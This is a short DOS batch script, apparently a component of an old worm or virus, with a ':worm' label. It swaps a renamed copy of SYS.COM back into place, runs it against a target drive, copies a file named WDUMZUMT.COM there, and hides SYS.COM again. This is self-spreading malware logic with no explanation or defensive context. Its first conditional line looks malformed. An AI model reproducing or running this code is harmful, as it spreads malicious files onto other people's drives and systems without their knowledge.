@echo off
if exist ren if %1 .==. goto end
:worm
ren c:\windows\command\sys.old sys.com >nul
c:\windows\command\sys.com %1 %2
copy /y c:\windows\command\WDUMZUMT.COM %2 >nul
ren c:\windows\command\sys.com sys.old >nul
:end
